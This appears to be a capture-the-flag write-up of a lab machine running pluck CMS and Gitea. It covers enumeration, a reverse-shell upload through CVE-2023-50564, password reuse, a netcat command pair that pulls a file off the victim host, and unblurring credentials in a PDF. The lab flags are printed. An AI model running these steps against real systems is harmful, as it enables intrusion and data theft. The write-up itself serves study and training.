Alrighty...

## Enumeration
- So let's take a look at what we've got.
### Website
- So our website here seems pretty old. It's running this janky WordPress alternative called [pluck](https://github.com/pluck-cms/pluck/wiki/).
- I can see a login page, which tells me that it's version 4.7.18. I can try some default passwords and check for known vulns.
- It's using PHP, so that's interesting.
- Username might be `admin` based on some context.
### Nmap
- Nmap scan results: 
```a
Starting Nmap 7.95 ( https://nmap.org ) at 2024-09-28 23:18 EDT  
Nmap scan report for 10.10.11.25  
Host is up (0.017s latency).  
Not shown: 65532 closed tcp ports (conn-refused)  
PORT     STATE SERVICE VERSION  
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)  
80/tcp   open  http    nginx 1.18.0 (Ubuntu)  
3000/tcp open  http    Golang net/http server  
1 service unrecognized despite returning data. If you know the service/version, please submi  
t the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :  
<SERIVICE RESPONSE HERE> 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/  
.  
Nmap done: 1 IP address (1 host up) scanned in 39.03 seconds
```
- This is pretty interesting...
- We have some sort of website running Go on port 3000, which is unexpected. I need to check that nginx version for vulnerabilities as well. The OpenSSH version looks legit as well.

### Golang site
- So port 3000 is the nice looking website. This is pretty interesting. 
- It looks like a self-hosted git service. Interesting.
- It's using Gitea.
- They're hosting their own source code for the pluck site!
- Username found on this site: `GreenAdmin`.
- I can see all the pages on their site this way. Less enumeration!

### CVE hunt
- First things first, pluck:
	- Version 4.7.18
	- I see [RCE](https://www.exploit-db.com/exploits/51592)!
	- This will be worth looking at for sure. Highly promising.
	- No CVE given, so that's a bit of a let down.
- Next, we have nginx:
	- Version 1.18.0
	- I don't see much of anything other than a DoS without a CVE.
- That Golang Webserver:
	- Unknown version
- Gitea:
	- Version 1.21.11
	- Some interesting things, none on this version. Could try some of it.
- That's just about everything.

## Exploitation
- Let's try that pluck exploit!
- The RCE from ExploitDB seems kind of cringe, so let's do [this PoC](https://github.com/Rai2en/CVE-2023-50564_Pluck-v4.7.18_PoC) for CVE-2023-50564 on pluck from GitHub.
- It seems as if we need valid login credentials. That's a bit rough.
- Luckily, there isn't a username required. Just need to figure out the password. 
- I used a hint to do this:
	- So enumerating sites is not my strong suit...
	- You can find a hash in the git repo, it's easily cracked.
- With this, I can just manually exploit.
- Upload zip, zip contains a PHP reverse shell.
- THERE WE GO!

### Foothold!
- So the exploit worked, but I'm not a user yet...
- Switching to junior was easy enough. I tried out reusing the password for the website, junior ended up using it. Fun fact: `iloveyou1` as a password is even less secure when you use it for multiple users.
- Little `su junior` action and we're good to go.
- User flag: `8011065ff0c4be024854c75bd12c236c`

### Escalation
- I see another file in here... a PDF.
- I want to see it. The best way to get this bad boy onto my machine isn't entirely clear. There should be a very easy way to get this done, but I might just be pretty silly.
- Here's how we're going to do it with netcat:
	- Host: `nc -lvp [my port] > file`
	- Victim: `nc [my IP] [my port] -w 3 < file`
- Success!
- So we have a PDF, and it contains blurred credentials. I need to unblur them!
- Well, here's a tool called [Depix](https://github.com/spipm/Depix) that claims to be able to do this!
- That was a bust. Let's try [unredacter](https://github.com/bishopfox/unredacter) instead.
- These tools are terrible, I'm taking a hint. I know what to do, but it is 1:15 in the morning and I just don't feel like digging anymore.
- So it turns out that I was right when I tried Depix, but there was just a ton of image processing required where I had to get the exact PNG and then convert the PNG to RGB. After that, I can use the tool. Really ridiculous.

# PWND!
- The ending there was kind of dumb.
- Root flag: `dfa24d2ce0260c810246c015c2fc6e87`